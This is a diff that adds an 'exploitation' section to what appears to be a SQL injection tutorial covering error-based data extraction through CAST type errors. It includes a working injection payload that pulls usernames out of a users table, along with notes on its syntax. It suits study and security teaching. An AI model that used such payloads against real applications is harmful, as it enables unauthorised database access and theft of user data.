@@ -16,3 +16,11 @@ Often, the data that you're trying to read is a string. Attempting to convert th
 ERROR: invalid input syntax for type integer: "Example data"
 ```
 This type of query may also be useful if a character limit prevents you from triggering conditional responses.
+
+### Queries that can be used for exploitation -
+```
+xyz' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+
+- Since and can be used only with Boolean we add `1=`
+- The ending `'` will trigger an error so we comment it out with `--`
